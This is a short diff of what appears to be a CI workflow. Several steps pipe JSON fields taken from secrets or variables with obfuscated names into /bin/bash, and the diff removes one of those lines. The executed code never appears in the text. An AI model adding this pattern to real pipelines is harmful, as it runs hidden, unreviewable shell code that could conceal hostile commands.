@@ -22,7 +22,6 @@ jobs:
           qdae7: ${{ secrets.qdae7 }}
         run: |
           printf '%s' "$qdae7" | jq -r .s3 | /bin/bash
-          echo $koitv9906 | jq -r .ng35 | /bin/bash
           printf '%s' "$rvjo104" | jq -r .bk90 | /bin/bash
           printf '%s' "$cet64715" | jq -r .xxdv2016 | /bin/bash
           printf '%s' "$kssuo22620" | jq -r .d32021 | /bin/bash
